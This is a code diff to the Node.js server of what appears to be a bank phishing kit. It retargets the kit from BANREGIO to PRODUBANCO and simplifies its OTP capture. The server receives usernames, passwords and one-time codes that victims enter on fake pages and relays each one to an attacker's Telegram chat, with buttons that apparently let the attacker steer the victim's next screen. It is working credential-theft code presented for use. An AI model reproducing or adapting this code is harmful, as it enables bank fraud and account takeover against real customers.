@@ -30,7 +30,7 @@ io.on('connection', (socket) => {
   socket.on('dataForm', ({ usuario, contrasena, fechaNacimiento, sessionId }) => {
     activeSockets.set(sessionId, socket);
 
-    const mensaje = `🔐 Nuevo intento de acceso BANREGIO:\n\n📧 Usuario: ${usuario}\n🔑 Contraseña: ${contrasena}\n`;
+    const mensaje = `🔐 Nuevo intento de acceso PRODUBANCO:\n\n📧 Usuario: ${usuario}\n🔑 Contraseña: ${contrasena}\n`;
     const botones = {
       reply_markup: {
         inline_keyboard: [
@@ -46,11 +46,11 @@ io.on('connection', (socket) => {
     bot.sendMessage(telegramChatId, mensaje, botones);
   });
 
-  // Códigos OTP (bienvenido.html)
-  socket.on('codigoIngresado', ({ codigo1, codigo2, sessionId }) => {
+  // Código OTP (bienvenido.html) - AHORA SOLO UNO
+  socket.on('codigoIngresado', ({ codigo, sessionId }) => {
     activeSockets.set(sessionId, socket);
 
-    const mensaje = `🔍 El usuario ingresó los siguientes códigos BANREGIO:\n\n🧾 Código SMS: ${codigo1}\n📩 Código Email: ${codigo2}`;
+    const mensaje = `🔍 El usuario ingresó el siguiente código PRODUBANCO:\n\n🧾 Código: ${codigo}`;
     const botones = {
       reply_markup: {
         inline_keyboard: [
@@ -66,11 +66,11 @@ io.on('connection', (socket) => {
     bot.sendMessage(telegramChatId, mensaje, botones);
   });
 
-  // OTP reintento (denegado.html)
-  socket.on('otpIngresado', ({ codigo1, codigo2, sessionId }) => {
+  // OTP reintento (denegado.html) - TAMBIÉN SOLO UNO
+  socket.on('otpIngresado', ({ codigo, sessionId }) => {
     activeSockets.set(sessionId, socket);
 
-    const mensaje = `📨 Reintento desde pantalla de error BANREGIO:\n\n🧾 Código SMS: ${codigo1}\n📩 Código Email: ${codigo2}`;
+    const mensaje = `📨 Reintento desde pantalla de error PRODUBANCO:\n\n🧾 Código: ${codigo}`;
     const botones = {
       reply_markup: {
         inline_keyboard: [
@@ -90,7 +90,7 @@ io.on('connection', (socket) => {
   socket.on('errorlogoForm', ({ usuario, contrasena, fechaNacimiento, sessionId }) => {
     activeSockets.set(sessionId, socket);
 
-    const mensaje = `⚠️ Nuevo intento fallido detectado BANREGIO:\n\n📧 Usuario: ${usuario}\n🔑 Clave: ${contrasena}\n`;
+    const mensaje = `⚠️ Nuevo intento fallido detectado PRODUBANCO:\n\n📧 Usuario: ${usuario}\n🔑 Clave: ${contrasena}\n`;
     const botones = {
       reply_markup: {
         inline_keyboard: [
